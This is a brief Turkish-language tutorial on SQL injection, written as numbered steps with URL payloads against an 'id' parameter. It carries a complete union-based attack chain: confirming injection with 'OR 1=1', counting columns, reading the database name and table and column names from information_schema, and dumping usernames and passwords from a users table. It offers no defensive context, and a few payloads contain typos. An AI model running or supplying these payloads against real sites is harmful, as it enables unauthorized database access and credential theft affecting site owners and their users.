# SQL Enjeksiyonu

1. Sitenin URL'sinde ```...?id=1``` varsa URL'ye ```...?#id=1 OR 1=1``` çalıştırmayı deniyoruz, eğer aynı site çıkıyorsa doğru yoldayız demektir
2. ```...?id=1 OR 1=1 order by 9``` deneyerek kaç sütun olduğunu anlamaya çalışıyoruz. 9 yerine başka sayılar koyup tek tek deniyoruz
3. Örneğin 11 sütun var. ```...?id=1 OR 1=1 union select 1,2,3,4,5,6,7,8,9,10,11``` yazıyoruz
4. Sayfa içinde bir yerde bozukluk buluyoruz. Örneğin 2. sütunda bozukluk var.
5. ```...?id=1 OR 1=1 unioun select 1,database(),3,4,5,6,7,8,9,10,11``` yazarak bozukluk olan yerden ```veritabanı ismini``` öğrenebiliriz
6. ```...?id=1 OR 1=1 union select 1,group_concat(table_name),3,4,5,6,7,8,9,10,11 from information_schema.tables where table_schema=database()``` yazarak tablo isimini öğrenebiliriz
7. ```...?id=1 OR 1=1 union select 1,group_concat(column_name),3,4,5,6,7,8,9,10,11 from information_schema.columns where table_name=0x7573657273(users tablosunun hex hali)``` isimleri hex'e çevirmek için google'a ```text to hex``` yazabiliriz
8. ```...?id=1 OR 1=1 union select 1,group_concat(unme,0x3a,pass),3,4,5,6,7,8,9,10,11 from users``` kullanıcı isimlerini ve şifreleri öğrenebiliriz (0x3a kullanıcı adı ve şifre arasına ":" koyar)
